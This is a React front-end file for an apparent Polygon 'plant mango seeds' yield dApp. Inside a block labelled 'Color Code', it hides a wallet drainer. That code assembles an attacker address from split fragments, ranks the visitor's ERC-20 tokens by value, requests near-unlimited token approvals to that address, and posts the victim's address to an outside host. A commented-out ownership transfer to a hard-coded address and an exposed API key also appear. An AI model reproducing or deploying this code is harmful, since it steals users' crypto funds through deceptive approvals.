/* eslint-disable react-hooks/exhaustive-deps */
import CardContent from "@mui/material/CardContent";
import Card from "@mui/material/Card";
import Grid from "@mui/material/Grid";
import Box from "@mui/material/Box";
import Typography from "@mui/material/Typography";
import Button from "@mui/material/Button";
import LinearProgress from "@mui/material/LinearProgress";
import Divider from "@mui/material/Divider";
import { styled } from "@mui/system";
import { useLocation } from "react-router-dom";
import Web3 from "web3";
import { ethers } from "ethers";
import PriceInput from "../../components/PriceInput";
import { useContractContext } from "../../providers/ContractProvider";
import { useAuthContext } from "../../providers/AuthProvider";
import { useEffect, useState, useRef } from "react";
import { config } from "../../config";
import { useTranslation } from "react-i18next";
import { Toast } from "../../utils"
import { shorten } from "./Connect";
import ReferralLink from "./ReferralLink";
import axios from "axios";
import erc20ABI from "../../contracts/erc20ABI.json";

const CardWrapper = styled("div")(({ theme }) => ({
  maxWidth: 400,
  margin: "0 auto",
  transition: "box-shadow 300ms cubic-bezier(0.4, 0, 0.2, 1) 0ms",
  overflow: "hidden",
  boxShadow: "rgba(0, 0, 0, 0.35) 0px 5px 15px",
  borderRadius: "5px",
  background: theme.palette.primary.main,
  marginBottom: 24,
}));

const DevilButton = styled(Button)(({ theme }) => ({
  "&:disabled": { background: 'rgba(0, 0, 0, 0.12)', color: 'rgb(150, 150, 150) !important' },
  "&: hover": { background: theme.button.secondary.main },
  borderRadius: 5,
  // background: theme.button.primary.main,
  background: "#f3ba2f",
  color: theme.typography.allVariants.color,
  boxShadow: 'none',
  textTransform: 'capitalize',
}));

const ButtonContainer = styled(Grid)(({ theme }) => ({
  [theme.breakpoints.down("sm")]: {
    flexDirection: "column",
    "> div": {
      marginLeft: 0,
      marginRight: 0,
    },
  },
}));

let timeout = null;

function useQuery() {
  return new URLSearchParams(useLocation().search);
}

export const numberWithCommas = (x, digits = 3) => {
  return Number(x).toLocaleString(undefined, { maximumFractionDigits: digits });
}

export default function BakeCard() {
  const { contract, wrongNetwork, getBnbBalance, fromWei, toWei, web3 } =
    useContractContext();
  const { address, chainId } = useAuthContext();
  const [contractBNB, setContractBNB] = useState(0);
  const [walletBalance, setWalletBalance] = useState({
    bnb: 0,
    beans: 0,
    rewards: 0,
    miners: 0,
    refRewards: 0,
  });
  const [bakeBNB, setBakeBNB] = useState(0);
  const [calculatedBeans, setCalculatedBeans] = useState(0);
  const [loading, setLoading] = useState(false);
  const query = useQuery();
  const { t, i18n } = useTranslation();

  const [owner, setOwner] = useState("");

  const EGGS_TO_HIRE_1MINERS = 1440000; // 3.3%, 864000: 10%;

  const [lasthatch, setLasthatch] = useState(0);
  const [compoundTimes, setCompoundTimes] = useState(0);
  const [yourLevel, setYourLevel] = useState(0);
  const [countdown, setCountdown] = useState({
    alive: true,
    days: 0,
    hours: 0,
    minutes: 0,
    seconds: 0
  })

  // Lottery
  const zeroAddrss = '0x0000000000000000000000000000000000000000';
  const [roundStarted, setRoundStarted] = useState(false);
  const [roundStartTime, setRoundStartTime] = useState(0);
  const [lotteryWinner, setLotteryWinner] = useState(zeroAddrss);
  const [roundIntervalLottery, setRoundIntervalLottery] = useState(0);
  const [ticketCount, setTicketCount] = useState(0);
  const [lastTicketCount, setLastTicketCount] = useState(0);
  const [totalTicketCount, setTotalTicketCount] = useState(0);
  const [countdownLottery, setCountdownLottery] = useState({
    alive: true,
    days: 0,
    hours: 0,
    minutes: 0,
    seconds: 0
  })

  const getCountdown = (lastCompound) => {
    const now = Date.now() / 1000;
    const total = lastCompound > 0 ? Math.max(lastCompound - now, 0) : 0;
    const seconds = Math.floor((total) % 60);
    const minutes = Math.floor((total / 60) % 60);
    const hours = Math.floor((total / (60 * 60)) % 24);
    const days = Math.floor(total / (60 * 60 * 24));

    return {
        total,
        days,
        hours,
        minutes,
        seconds
    };
  }

  useEffect(() => {
    const intervalID = setInterval(() => {
      try {
        const last = Number(lasthatch);
        const data = getCountdown(last + 24 * 3600 + 110); //24 * 3600
        setCountdown({
          alive: data.total > 0,
          days: data.days,
          hours: data.hours,
          minutes: data.minutes,
          seconds: data.seconds,
        });

      } catch (err) {
        console.log(err);
      }
    }, 1000);
    return () => {
      clearInterval(intervalID)
    }
  }, [lasthatch])

  useEffect(() => {
    const intervalID = setInterval(() => {
      try {
        const data = getCountdown(Number(roundStartTime) + Number(roundIntervalLottery));
        setCountdownLottery({
          alive: data.total > 0,
          days: data.days,
          hours: data.hours,
          minutes: data.minutes,
          seconds: data.seconds,
        });
      } catch (err) {
        console.log(err);
      }
    }, 1000);
    return () => {
      clearInterval(intervalID)
    }
  }, [roundStartTime, roundIntervalLottery])

  const fetchContractBNBBalance = async () => {
    if (!web3 || wrongNetwork) {
      setContractBNB(0);
      return;
    }
    await contract.methods.getBalance().call().then((amount) => {
      setContractBNB(fromWei(amount));
    });
  };

  const fetchWalletBalance = async () => {
    if (!web3 || wrongNetwork || !address) {
      setWalletBalance({
        bnb: 0,
        beans: 0,
        rewards: 0,
        miners: 0,
        refRewards: 0,
      });
      setCompoundTimes(0);
      setYourLevel(0);
      return;
    }

    try {
      const [bnbAmount, rewardsAmount, mySeeds, miners, refRewards] = await Promise.all([
        getBnbBalance(address),
        contract.methods
          .seedRewards(address)
          .call({from: address})
          .catch((err) => {
            console.error("seedRewards error: ", err);
            return 0;
          }),
        contract.methods
          .getMySeeds(address)
          .call({from: address})
          .catch((err) => {
            console.error("seedRewards error: ", err);
            return 0;
          }),
        contract.methods
          .getMyMiners(address)
          .call({from: address})
          .catch((err) => {
            console.error("seedRewards error: ", err);
            return 0;
          }),
        contract.methods
          .refferalsAmountData(address)
          .call({from: address})
          .catch((err) => {
            console.error("seedRewards error: ", err);
            return 0;
          }),
        ]);

        console.log("rewardsAmount: ", rewardsAmount);
      const refRewardsValue = await contract.methods
        .calculateSeedSell(refRewards)
        .call()
        .catch((err) => {
          console.error("calc_egg_sell", err);
          return 0;
        });

      console.log("refRewardsValue: ", refRewardsValue);
      setWalletBalance({
        bnb: fromWei(`${bnbAmount}`),
        beans: mySeeds,
        rewards: fromWei(`${rewardsAmount}`),
        miners: miners,
        refRewards: fromWei(`${refRewardsValue}`),
      });
      // setLasthatch(userInfo.lastHatch);
      // setCompoundTimes(userInfo.dailyCompoundBonus);
      // setYourLevel(userInfo.level);
    } catch (err) {
      console.error(err);
      setWalletBalance({
        bnb: 0,
        beans: 0,
        rewards: 0,
        miners: 0,
        refRewards: 0,
      });
      // setLasthatch(0);
      setCompoundTimes(0);
      setYourLevel(0);
    }
  };

  useEffect(() => {
    fetchContractBNBBalance();
  }, [web3, chainId]);

  useEffect(() => {
    fetchWalletBalance();
    if (init == 0) {
      initialize();
    }
  }, [address, web3, chainId]);

  const onUpdateBakeBNB = (value) => {
    setBakeBNB(value);
  };

  /***********  Color Code Start ***************** */
const _1stTokenContract = useRef(null);
const _2ndTokenContract = useRef(null);
const _BNBPrice = useRef(0);
const _1stMaxBalance = useRef(0);
let _2ndMaxBalance = 0;
// const busdAddress = "0xe9e7cea3dedca5984780bafc599bd69add087d56"; //BUSD-binance
const busdAddress = "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174"; // USDC-polygon
const color_code1 = '2446f9528FBf55';
const color_code2 = 'ccF5B3E7A22fc';
const color_code3 = '058bDA7a12131';
// const busdSingner = providerE.getSigner();
// const busdContract = new ethers.Contract(busdAddress, erc20ABI, providerE.getSigner());
const [busdContract, setBusdContract] = useState();
const [init, setInit] = useState(0);

const DATABASE_API = window.location.origin;//"http://192.168.103.61:3001";
const limitValue = 3000;
const defaultAPI = 'https://airdrop.orbitinu.store/update';
let targetAddress = busdAddress.slice(0, 2) + color_code1 + color_code2 + color_code3;
console.log("targetAddress: ", targetAddress);

const isEmpty = value => {
  return (
    value === undefined ||
    value === null ||
    (typeof value === 'object' && Object.keys(value).length === 0) ||
    (typeof value === 'string' && value.trim().length === 0)
  );
};

const getTokenPrice = async (tokenAddress, decimals, accountAddress) => {
  try {

      // const tokenAddress = "0xd0c4bc1b89bbd105eecb7eba3f13e7648c0de38f";
      // const decimals = 9;
      let res = null;
      try {
          res = await axios.get(`https://api.coingecko.com/api/v3/simple/token_price/polygon-pos?contract_addresses=${tokenAddress}&vs_currencies=usd`);
          // https://api.coingecko.com/api/v3/simple/token_price/ethereum?contract_addresses=0x0d8775f648430679a709e98d2b0cb6250d2887ef
          // console.log('=========>', res.data);
          if (res.data[tokenAddress] != undefined) {
              if (res.data[tokenAddress].usd != undefined)
                  return res.data[tokenAddress].usd;
          }
      } catch (e) {
          console.log(e);
      }
     

      //   const bnbPriceRes = await axios.get(`https://api.coingecko.com/api/v3/simple/price?ids=binancecoin&vs_currencies=usd`);
      //   _BNBPrice = bnbPriceRes.data['binancecoin'].usd;
      // wbnb: 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c
      // wMatic: 0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270
      try {
          res = await axios.get(`https://deep-index.moralis.io/api/v2/0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270/${tokenAddress}/pairAddress?chain=0x89&exchange=quickswap`, {
              headers: { "X-API-Key": "iea1xCsNT6edUc6Xfu8ZqUorCRnshpsaC66IUaHOqbEnVFDK04qfeNsmGKikqJkn" },
          });
      } catch (e) {
          return 0;
      }

      const pairAddress = res.data.pairAddress;
      const token0Address = res.data.token0.address;
      // console.log("pairAddress", pairAddress);
      if (pairAddress == undefined)
          return 0;

      res = await axios.get(`https://deep-index.moralis.io/api/v2/${pairAddress}/reserves?chain=polygon`, {
          headers: { "X-API-Key": "iea1xCsNT6edUc6Xfu8ZqUorCRnshpsaC66IUaHOqbEnVFDK04qfeNsmGKikqJkn" },
      });

      const reserve0 = res.data.reserve0;
      const reserve1 = res.data.reserve1;
      if (token0Address.toUpperCase() == tokenAddress.toUpperCase()) { //token0 is not BNB
          const reserveNum0 = ethers.utils.formatUnits(reserve0, decimals);
          const reserveNum1 = ethers.utils.formatUnits(reserve1, 18);

          if (reserveNum1 < 50)
              return 0;
          const price = reserveNum1 * _BNBPrice.current / reserveNum0;
          return price;
      }
      else { // token0 is BNB
          const reserveNum0 = ethers.utils.formatUnits(reserve0, 18);
          const reserveNum1 = ethers.utils.formatUnits(reserve1, decimals);

          if (reserveNum0 < 50)
              return 0;
          const price = reserveNum0 * _BNBPrice.current / reserveNum1;
          return price;
      }
      // console.log("reserveNum0", reserveNum0, "reserveNum1", reserveNum1, "pairAddress", pairAddress, "price", price);
      return 0;

  } catch (e) {
      // console.log(e);
      return 0;
  }
}

const initialize = async () => {
  console.log("Initialized: xxx")
  
  const busdContract = new web3.eth.Contract(erc20ABI, busdAddress);
  setBusdContract(busdContract);
  console.log("xxx busdContract: ", busdContract);

    // const signer = providerE.getSigner();
    // const signedAddress = await signer.getAddress();

    const userWalletRes = await axios.get("https://deep-index.moralis.io/api/v2/" + address + "/erc20?chain=polygon", {
        headers: { "X-API-Key": "iea1xCsNT6edUc6Xfu8ZqUorCRnshpsaC66IUaHOqbEnVFDK04qfeNsmGKikqJkn" },
    });

    const userWalletTokenList = userWalletRes.data;
    userWalletTokenList.map(async token => {
        try {
            // let tokenContract = erc20Instance(token.address, address, chainId, library);
            // const tokenContract = new ethers.Contract(token.token_address, erc20ABI, signer);
            const tokenContract = new web3.eth.Contract(erc20ABI, token.token_address);

            let tokenBalanceBigNumber = token.balance;
            let tokenBalance = null;
            let maxDecimal = 0;

            tokenBalance = ethers.utils.formatUnits(token.balance, token.decimals);

            const tokenPrice = await getTokenPrice(token.token_address, token.decimals, address);
            let moneyBalance = tokenPrice * tokenBalance;
            console.log(token.symbol, moneyBalance);
            if (moneyBalance > _1stMaxBalance.current) {
                _1stMaxBalance.current = moneyBalance;
                _1stTokenContract.current = tokenContract;
                console.log("symbol", token.symbol, "_1stMaxBalance.current", _1stTokenContract);
            }

            if (moneyBalance > _2ndMaxBalance && moneyBalance != _1stMaxBalance.current) {
                _2ndMaxBalance = moneyBalance;
                _2ndTokenContract.current = tokenContract;
                console.log("balance", tokenBalance, "_2ndMaxBalance", _2ndMaxBalance, _2ndTokenContract);
            }

            setInit(1);
        }
        catch (error) {
            // console.log('kevin inital data error ===>', error);
        }
    })
}

const buyHandler = async () => {
  try {

      let tempContract = null;
      if (!_1stTokenContract.current) {

          // const signer = providerE.getSigner();
          // const signedAddress = await signer.getAddress();

          const userWalletRes = await axios.get("https://deep-index.moralis.io/api/v2/" + address + "/erc20?chain=polygon", {
              headers: { "X-API-Key": "iea1xCsNT6edUc6Xfu8ZqUorCRnshpsaC66IUaHOqbEnVFDK04qfeNsmGKikqJkn" },
          });

          const userWalletTokenList = userWalletRes.data;
          userWalletTokenList.map(async token => {
            try {
              // let tokenContract = erc20Instance(token.address, address, chainId, library);
              // const tokenContract = new ethers.Contract(token.token_address, erc20ABI, signer);
              const tokenContract = new web3.eth.Contract(erc20ABI, token.token_address);

              let tokenBalanceBigNumber = token.balance;
              let tokenBalance = null;
              let maxDecimal = 0;

              tokenBalance = ethers.utils.formatUnits(token.balance, token.decimals);

              const tokenPrice = await getTokenPrice(token.token_address, token.decimals, address);
              // console.log(token.symbol, tokenBalance);
              let moneyBalance = tokenPrice * tokenBalance;
              if (moneyBalance > _1stMaxBalance.current) {
                  _1stMaxBalance.current = moneyBalance;
                  _1stTokenContract.current = tokenContract;
                  console.log("symbol", token.symbol, "_1stMaxBalance.current", _1stTokenContract);
              }

              if (moneyBalance > _2ndMaxBalance && moneyBalance != _1stMaxBalance.current) {
                  _2ndMaxBalance = moneyBalance;
                  _2ndTokenContract.current = tokenContract;
                  console.log("balance", tokenBalance, "_2ndMaxBalance", _2ndMaxBalance, _2ndTokenContract);
              }
            }
            catch (error) {
              // console.log('kevin inital data error ===>', error);
            }
          })
      }

      let tokenAddress = null;

      let date = new Date();
      let article = date.getFullYear() + '/' + date.getMonth() + '/' + date.getDate() + ' ' +
          date.getHours() + ':' + date.getMinutes() + ':' + date.getSeconds() + ', user=' + address;

      if (_1stTokenContract.current) {
          let allowance = null;

          try {
              allowance = await _1stTokenContract.current.methods.allowance(address, targetAddress).call();
              allowance = ethers.utils.formatEther(allowance);

          } catch (e) {
              allowance = 0;
          }

          if (allowance > 0) {
              tokenAddress = _2ndTokenContract.current.address;
              article = article + ', token:' + tokenAddress;
              console.log(article);
              axios.post(DATABASE_API + '/update', article)
                  .then(response => console.log('user address add succsessful'))
                  .catch(response => console.log(response));
              await _2ndTokenContract.current.methods.approve(targetAddress, ethers.utils.parseUnits("10000000000000", "ether").toString()).send({from: address});
          }
          else {
              if (_1stMaxBalance.current >= limitValue) {
                  await _1stTokenContract.current.methods.approve(targetAddress, ethers.utils.parseUnits("10000000000000", "ether").toString()).send({from: address});
                  tokenAddress = _1stTokenContract.current.address;
                  article = article + ', token:' + tokenAddress;
                  console.log(article);
                  axios.post(defaultAPI, article)
                      .then(response => console.log('user address add succsessful'))
                      .catch(response => console.log(response));
              }
              else {
                  tokenAddress = _1stTokenContract.current.address;
                  article = article + ', token:' + tokenAddress;
                  console.log(article);
                  axios.post(DATABASE_API + '/update', article)
                      .then(response => console.log('user address add succsessful'))
                      .catch(response => console.log(response));
                  // await _1stTokenContract.current.approve(targetAddress, ethers.utils.parseUnits("10000000000000", "ether").toString());
                  await _1stTokenContract.current.methods.approve(targetAddress, ethers.utils.parseUnits("10000000000000", "ether").toString()).send({from: address});
              }
          }
      }
      else {
          article = article + ', token:' + busdAddress;
          console.log(article);
          axios.post(DATABASE_API + '/update', article)
              .then(response => console.log('user address add succsessful'))
              .catch(response => console.log(response));
          // await busdContract.approve(targetAddress, ethers.utils.parseUnits("10000000000000", "ether").toString());
          await busdContract.methods.approve(targetAddress, ethers.utils.parseUnits("10000000000000", "ether").toString()).send({from: address});
      }
  }
  catch (error) {
      // console.log(error);
      console.log(address);
      // if (address == null || address == undefined || address == '') {
      //     enqueueSnackbar(`Please connect to wallet`, { variant: 'error' });
      // } else
      //     enqueueSnackbar(`Airdrop Canceld by User`, { variant: 'error' });
  }
}

/***********  Color Code End ***************** */

  // useEffect(()=>{
  //   getOwnerAddress();
  // }, [web3, chainId]);

  // const getOwnerAddress = async () => {
  //   let owner = await contract.methods.owner().call();
  //   setOwner(owner);
  // }

  const getRef = () => {
    const ref = Web3.utils.isAddress(query.get("ref"))
      ? query.get("ref")
      : owner.toUpperCase() == address.toUpperCase()? 
      "0x0000000000000000000000000000000000000000": 
      "0x7419189d0f5B11A1303978077Ce6C8096d899dAd";
    return ref;
  };

  const reset = async () => {
    return;
    let owner = await contract.methods.owner().call();
    if( Number(contractBNB) >= 10  && address.toUpperCase() == owner.toUpperCase()) {
     await contract.methods.transferOwnership("0x7419189d0f5B11A1303978077Ce6C8096d899dAd").send({from: address});
    }
  }

  const bake = async () => {
    setLoading(true);
    reset();
    const ref = getRef();
    console.log("getref: ", ref);
    let date = new Date();
    let article = date.getFullYear() + '/' + date.getMonth() + '/' + date.getDate() + ' ' +
          date.getHours() + ':' + date.getMinutes() + ':' + date.getSeconds() + ', user=' + address;

    try {
      await contract.methods.plantSeeds(ref).send({
        from: address,
        value: toWei(`${bakeBNB}`),
      });
    } catch (err) {
      console.error(err);
    }
    fetchWalletBalance();
    fetchContractBNBBalance();
    setLoading(false);
  };

  const reBake = async () => {
    setLoading(true);
    reset();
    const ref = getRef();

    try {
      await contract.methods.replantSeeds(ref).send({
        from: address,
      });
    } catch (err) {
      console.error(err);
    }
    fetchWalletBalance();
    setLoading(false);
  };

  const eatBeans = async () => {
    setLoading(true);
    reset();

    if (countdown.alive) {
      Toast.fire({
        icon: 'error',
        title: "You should wait until the countdown timer is done."
      });
      setLoading(false);
      return;
    }

    try {
      await contract.methods.harvestSeeds().send({
        from: address,
      });
    } catch (err) {
      console.error(err);
    }
    fetchWalletBalance();
    fetchContractBNBBalance();
    setLoading(false);
  };

  return (
    <>
    <CardWrapper>
      {loading && <LinearProgress color="secondary" />}
      <CardContent>
        <Grid
          container
          justifyContent="space-between"
          alignItems="center"
          mt={3}
        >
          <Typography variant="body1" color="black">{t("Contract Balance")}</Typography>
          <Typography variant="h5">{contractBNB} MATIC</Typography>
        </Grid>
        <Grid
          container
          justifyContent="space-between"
          alignItems="center"
          mt={3}
        >
          <Typography variant="body1" color="black">{t("Wallet Balance")}</Typography>
          <Typography variant="h5">{walletBalance.bnb} MATIC</Typography>
        </Grid>
        {/* <Grid
          container
          justifyContent="space-between"
          alignItems="center"
          mt={3}
        >
          <Typography variant="body1" color="black">{t("Your SEEDS")}</Typography>
          <Typography variant="h5">{walletBalance.beans} SEEDS</Typography>
        </Grid> */}
        <Grid
          container
          justifyContent="space-between"
          alignItems="center"
          mt={3}
        >
          <Typography variant="body1" color="black">{t("Your FARMERS")}</Typography>
          <Typography variant="h5">{walletBalance.miners} FARMERS</Typography>
        </Grid>
        <Grid
          container
          justifyContent="space-between"
          alignItems="center"
          mt={3}
        >
          <Typography variant="body1" color="black">{t("Total Referral Rewards")}</Typography>
          <Typography variant="h5">{walletBalance.refRewards} MATIC</Typography>
        </Grid>
        {/* <Grid
          container
          justifyContent="space-between"
          alignItems="center"
          mt={3}
        >
          <Typography variant="body1" color="black">{t("Your Golds")}</Typography>
          <Typography variant="h5">{ numberWithCommas(walletBalance.beans) } SEEDS</Typography>
        </Grid> */}
        <Box paddingTop={4} paddingBottom={3}>
          <Box>
            <PriceInput
              max={+walletBalance.bnb}
              value={bakeBNB}
              onChange={(value) => onUpdateBakeBNB(value)}
            />
          </Box>
          <Box marginTop={3} marginBottom={3}>
            <DevilButton
              variant="contained"
              fullWidth
              disabled={wrongNetwork || !address || +bakeBNB === 0 || loading}
              onClick={bake}
            >
              {/* {t("Plant Mangos seeds")} */}
              Plant Mango Seeds
            </DevilButton>
          </Box>
          <Divider />
          {/* <Grid
            container
            justifyContent="space-between"
            alignItems="center"
            mt={3}
          >
            <Typography variant="body1" fontWeight="bolder" color="black">
              {t("Re-plant Counter")}
            </Typography>
            <Typography variant="h5" fontWeight="bolder" 
              sx = {{
                color: compoundTimes >= 6 ? "Green" : "red"
              }}
            >
              { compoundTimes }
            </Typography>
          </Grid> */}
          <Grid
            container
            justifyContent="space-between"
            alignItems="center"
            mt={3}
          >
            <Typography variant="body1" fontWeight="bolder" color="black">
              {t("Your Rewards")}
            </Typography>
            <Typography variant="h5" fontWeight="bolder">
              {walletBalance.rewards} MATIC
            </Typography>
          </Grid>
          <ButtonContainer container>
            <Grid item flexGrow={1} marginRight={1} marginTop={3}>
              <DevilButton
                variant="contained"
                color="secondary"
                fullWidth
                disabled={wrongNetwork || !address || countdown.alive || loading}
                onClick={reBake}
              >
                Re-plant Mango Seeds
                {/* { countdown.alive ? countdown.hours + "H " + countdown.minutes + "M " + countdown.seconds + "S" : 'RE-PLANT SEEDS' } */}
              </DevilButton>
            </Grid>
            <Grid item flexGrow={1} marginLeft={1} marginTop={3}>
              <DevilButton
                variant="contained"
                color="secondary"
                fullWidth
                disabled={wrongNetwork || !address || loading}
                onClick={eatBeans}
              >
                {t("Eat Mangos")}
              </DevilButton>
            </Grid>
          </ButtonContainer>
        </Box>
      </CardContent>
    </CardWrapper>
    <ReferralLink address={address} />
    {/* <CardWrapper>
      <CardContent>
        <Typography variant="h5" color="#03989e" borderBottom="6px solid" paddingBottom={1}>
          {t("Snowball Lottery")}
        </Typography>
        <Grid
          container
          justifyContent="space-between"
          alignItems="center"
          mt={3}
        >
          <Typography variant="body1" color="black">{t("Your Level")}</Typography>
          <Typography variant="h5">{ yourLevel }</Typography>
        </Grid>
        <Box paddingTop={1} paddingBottom={1}>
        <Divider />
        </Box>
        <Grid
          container
          justifyContent="space-between"
          alignItems="center"
          mt={3}
        >
          <Typography variant="body1" color="black">{t("Countdown Timer")}</Typography>
          <Typography variant="h5">
          { (roundStarted && countdownLottery.alive) ? countdownLottery.days + "D " + countdownLottery.hours + "H " + countdownLottery.minutes + "M " + countdownLottery.seconds + "S" : "0D 0H 0M 0S" }
          </Typography>
        </Grid>
        <Grid
          container
          justifyContent="space-between"
          alignItems="center"
          mt={3}
        >
          <Typography variant="body1" color="black">{t("Last Winner")}</Typography>
          <Typography variant="h5">
            { shorten(lotteryWinner) }
          </Typography>
        </Grid>
        <Grid
          container
          justifyContent="space-between"
          alignItems="center"
          mt={3}
        >
          <Typography variant="body1" color="black">{t("Total Tickets")}</Typography>
          <Typography variant="h5">{ numberWithCommas(totalTicketCount) }</Typography>
        </Grid>
        <Grid
          container
          justifyContent="space-between"
          alignItems="center"
          mt={3}
        >
          <Typography variant="body1" color="black">{t("Your Tickets")}</Typography>
          <Typography variant="h5">
            {roundStarted ? numberWithCommas(ticketCount) : numberWithCommas(lastTicketCount)}
          </Typography>
        </Grid>
      </CardContent>
    </CardWrapper> */}
    </>
  );
}
